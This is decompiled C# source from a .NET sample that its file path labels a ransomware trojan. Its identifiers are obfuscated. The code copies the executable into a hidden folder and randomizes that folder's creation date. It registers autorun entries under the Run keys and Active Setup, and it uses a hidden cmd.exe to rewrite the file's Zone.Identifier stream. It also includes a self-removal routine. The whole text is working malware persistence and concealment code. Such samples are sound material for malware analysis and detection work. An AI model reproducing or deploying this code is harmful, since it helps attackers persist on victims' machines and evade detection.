// Decompiled with JetBrains decompiler
// Type: ẍ߮ᑐᗭ৲ᗒ̛ᗫ།ཏӍᡸẗ᡽़य़ᢠ᛭༌.ậᩀᖹपᥭࢲᩡ३ᘁრಣᜳᯃ౰ᗥ
// Assembly: start1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B30574D9-5740-4AF1-9AAD-FBD9FE6B2A96
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-89f3ccf08032a8f789a4d56feebe797fb02d3c983b9f4783b0428640dbafc04e.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using ẍ߮ᑐᗭ\u09F2ᗒ̛ᗫ\u0F0DཏӍ\u1878ẗ\u187D़य़ᢠ\u16ED\u0F0C;

namespace ẍ߮ᑐᗭ\u09F2ᗒ̛ᗫ\u0F0DཏӍ\u1878ẗ\u187D़य़ᢠ\u16ED\u0F0C
{
  internal class ậᩀᖹपᥭࢲᩡ३ᘁრಣᜳᯃ\u0C70ᗥ
  {
    public static void Ņ٦۹ᒨυ()
    {
      ậᩀᖹपᥭࢲᩡ३ᘁრಣᜳᯃ\u0C70ᗥ.Ǥ᮫ᇎខᣈི\u1AA1();
      ậᩀᖹपᥭࢲᩡ३ᘁრಣᜳᯃ\u0C70ᗥ.ᇐħٓŪᐽၗʍ\u061Fޑ̴ދះӨݳͫ();
      ậᩀᖹपᥭࢲᩡ३ᘁრಣᜳᯃ\u0C70ᗥ.ʳโࢭᩯ\u0D5Bမ\u19E2ܡ\u0C5CןᄀɆដẐආ();
    }

    private static void Ǥ᮫ᇎខᣈི\u1AA1()
    {
      try
      {
        if (!Directory.Exists(\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.\u0E8EႬተી५ܬЍãͲḷ\u104F\u0C8Dᩰኛ\u1BF7))
          Directory.CreateDirectory(\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.\u0E8EႬተી५ܬЍãͲḷ\u104F\u0C8Dᩰኛ\u1BF7);
      }
      catch
      {
      }
      try
      {
        File.Copy(Process.GetCurrentProcess().MainModule.FileName, Path.Combine(\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.\u0E8EႬተી५ܬЍãͲḷ\u104F\u0C8Dᩰኛ\u1BF7, \u1C86\u08D4\u0F2Bᢢᛞዿ᪳ಸืቦפÃዄ\u0A00ԭឝᠶ.ᥣᑉᑡ᠗พ(\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.\u0F3E\u08BD\u0FC1\u0899ᘸţᚑᔗஓἻ, true)), true);
      }
      catch
      {
      }
      try
      {
        if (\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.\u0036ጋֹƜЋ\u1368\u171B\u0A50Ŏ)
        {
          Random random = new Random();
          int day = random.Next(1, 28);
          int month = random.Next(1, 12);
          int year = random.Next(2000, DateTime.Now.Year);
          Directory.SetCreationTime(Path.Combine(\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.\u0E8EႬተી५ܬЍãͲḷ\u104F\u0C8Dᩰኛ\u1BF7, \u1C86\u08D4\u0F2Bᢢᛞዿ᪳ಸืቦפÃዄ\u0A00ԭឝᠶ.ᥣᑉᑡ᠗พ(\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.\u0F3E\u08BD\u0FC1\u0899ᘸţᚑᔗஓἻ, true)), new DateTime(year, month, day));
        }
      }
      catch
      {
      }
      if (\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.ᮞᥥᚌၬਡəᕲᤌ)
      {
        try
        {
          File.SetAttributes(\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.\u0E8EႬተી५ܬЍãͲḷ\u104F\u0C8Dᩰኛ\u1BF7, FileAttributes.Hidden | FileAttributes.NotContentIndexed);
        }
        catch
        {
        }
      }
      if (!\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.Ẫߌٳ\u083Bũ)
        return;
      try
      {
        File.SetAttributes(Path.Combine(\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.\u0E8EႬተી५ܬЍãͲḷ\u104F\u0C8Dᩰኛ\u1BF7, \u1C86\u08D4\u0F2Bᢢᛞዿ᪳ಸืቦפÃዄ\u0A00ԭឝᠶ.\u1CC3̯\u0DF6ᎂ\u0970సటᬱථʎ\u05FAᶧሩ\u08D7ፚ(\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.\u0F3E\u08BD\u0FC1\u0899ᘸţᚑᔗஓἻ, true)), FileAttributes.Hidden | FileAttributes.NotContentIndexed);
      }
      catch
      {
      }
    }

    public static void ʳโࢭᩯ\u0D5Bမ\u19E2ܡ\u0C5CןᄀɆដẐආ()
    {
      try
      {
        if (\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.ᵀ\u1B5AᢉϜᐭሳ\u1317\u0C0DᰟЛᢔᴫದέ)
          Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue(\u1C86\u08D4\u0F2Bᢢᛞዿ᪳ಸืቦפÃዄ\u0A00ԭឝᠶ.ᥣᑉᑡ᠗พ(\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.ఫ\u00B0ᘵޏǸዲ\u0C4F\u0B78F̮\u1377, true), (object) (\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.\u0E8EႬተી५ܬЍãͲḷ\u104F\u0C8Dᩰኛ\u1BF7 + "\\" + \u1C86\u08D4\u0F2Bᢢᛞዿ᪳ಸืቦפÃዄ\u0A00ԭឝᠶ.ᥣᑉᑡ᠗พ(\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.\u0F3E\u08BD\u0FC1\u0899ᘸţᚑᔗஓἻ, true)));
      }
      catch
      {
      }
      try
      {
        if (\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.әҍझΫᓹᙧ\u0A5D\u0DF5ḏᝲᧈԽ\u19E2\u1AD9ᩌǡဏᄰ)
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue(\u1C86\u08D4\u0F2Bᢢᛞዿ᪳ಸืቦפÃዄ\u0A00ԭឝᠶ.ᥣᑉᑡ᠗พ(\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.ఫ\u00B0ᘵޏǸዲ\u0C4F\u0B78F̮\u1377, true), (object) (\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.\u0E8EႬተી५ܬЍãͲḷ\u104F\u0C8Dᩰኛ\u1BF7 + "\\" + \u1C86\u08D4\u0F2Bᢢᛞዿ᪳ಸืቦפÃዄ\u0A00ԭឝᠶ.ᥣᑉᑡ᠗พ(\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.\u0F3E\u08BD\u0FC1\u0899ᘸţᚑᔗஓἻ, true)));
      }
      catch
      {
      }
      try
      {
        if (!\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.ᓹS᠒و\u0EEEᢑྲӛ)
          return;
        RegistryKey subKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\" + \u1C86\u08D4\u0F2Bᢢᛞዿ᪳ಸืቦפÃዄ\u0A00ԭឝᠶ.ᥣᑉᑡ᠗พ(\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.ఓି\u0F30ᚰ\u0017థȨṿപᥛ\u1C98, true));
        subKey.SetValue("StubPath", (object) (\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.\u0E8EႬተી५ܬЍãͲḷ\u104F\u0C8Dᩰኛ\u1BF7 + "\\" + \u1C86\u08D4\u0F2Bᢢᛞዿ᪳ಸืቦפÃዄ\u0A00ԭឝᠶ.ᥣᑉᑡ᠗พ(\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.\u0F3E\u08BD\u0FC1\u0899ᘸţᚑᔗஓἻ, true)));
        subKey.SetValue("IsInstalled", (object) 1, RegistryValueKind.DWord);
      }
      catch
      {
      }
    }

    private static void ᇐħٓŪᐽၗʍ\u061Fޑ̴ދះӨݳͫ()
    {
      try
      {
        Process process = new Process();
        process.StartInfo = new ProcessStartInfo()
        {
          FileName = "cmd.exe",
          UseShellExecute = false,
          RedirectStandardInput = true,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        process.Start();
        StreamWriter standardInput = process.StandardInput;
        standardInput.WriteLine("cd " + \u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.\u0E8EႬተી५ܬЍãͲḷ\u104F\u0C8Dᩰኛ\u1BF7);
        standardInput.WriteLine("echo [zoneTransfer]ZoneID = 2 > " + \u1C86\u08D4\u0F2Bᢢᛞዿ᪳ಸืቦפÃዄ\u0A00ԭឝᠶ.ᥣᑉᑡ᠗พ(\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.\u0F3E\u08BD\u0FC1\u0899ᘸţᚑᔗஓἻ, true) + ":ZONE.identifier");
        standardInput.Close();
        process.Kill();
      }
      catch
      {
      }
    }

    public static void \u0CA9ĳা\u1806\u192F()
    {
      try
      {
        Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").DeleteValue(\u1C86\u08D4\u0F2Bᢢᛞዿ᪳ಸืቦפÃዄ\u0A00ԭឝᠶ.ᥣᑉᑡ᠗พ(\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.ఫ\u00B0ᘵޏǸዲ\u0C4F\u0B78F̮\u1377, true));
      }
      catch
      {
      }
      try
      {
        Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").DeleteValue(\u1C86\u08D4\u0F2Bᢢᛞዿ᪳ಸืቦפÃዄ\u0A00ԭឝᠶ.ᥣᑉᑡ᠗พ(\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.ᔤٓถᛧ௫ገᑾ, true));
      }
      catch
      {
      }
      try
      {
        Registry.LocalMachine.DeleteSubKey("SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\" + \u1C86\u08D4\u0F2Bᢢᛞዿ᪳ಸืቦפÃዄ\u0A00ԭឝᠶ.ᥣᑉᑡ᠗พ(\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.ఓି\u0F30ᚰ\u0017థȨṿപᥛ\u1C98, true));
      }
      catch
      {
      }
      try
      {
        switch (\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.حᝊఠ௯ड\u09DE)
        {
          case RegistryHive.CurrentUser:
            Registry.CurrentUser.DeleteSubKey(\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.\u1AE9ᬲᆉἡᙝͮີ᪉);
            break;
          case RegistryHive.LocalMachine:
            Registry.LocalMachine.DeleteSubKey(\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.\u1AE9ᬲᆉἡᙝͮີ᪉);
            break;
        }
      }
      catch
      {
      }
      ậᩀᖹपᥭࢲᩡ३ᘁრಣᜳᯃ\u0C70ᗥ.\u07C3શᅩ\u175Dᒠᒲᆵᖟ\u0096ە\u19E0Ԙූᑥ();
    }

    public static void \u07C3શᅩ\u175Dᒠᒲᆵᖟ\u0096ە\u19E0Ԙූᑥ()
    {
      try
      {
        string tempFileName = Path.GetTempFileName();
        File.Delete(tempFileName);
        File.Move(Process.GetCurrentProcess().MainModule.FileName, tempFileName);
        វ\u00B7᭘œᐬ\u0B11॔\u087Fܮ\u0E77\u09F2.ዑಛᴽฏ൨ᆔྞॸ\u0E71ཨՋෆᄾᩊᤜܑ੭(tempFileName, (string) null, វ\u00B7᭘œᐬ\u0B11॔\u087Fܮ\u0E77\u09F2.ᜣ᷄\u0C7B\u1AF9ဇႝᙛྮͱ.ůᵝČឝᶮሧ\u1AD8ᐥᗆʈ\u02EDഝ2Ǳ);
      }
      catch (Exception ex)
      {
      }
    }

    public enum \u0D6D౧ুᖷዐឥ
    {
      ᗊ٘ฉడ\u0D84̽\u0BADᆟ,
      \u1CC5\u0EE4ግᓧዽڼᰥᔚԬ\u1C87\u175A\u008B,
      ڒҥਰӉ\u1CBB\u17EFઌ,
    }
  }
}
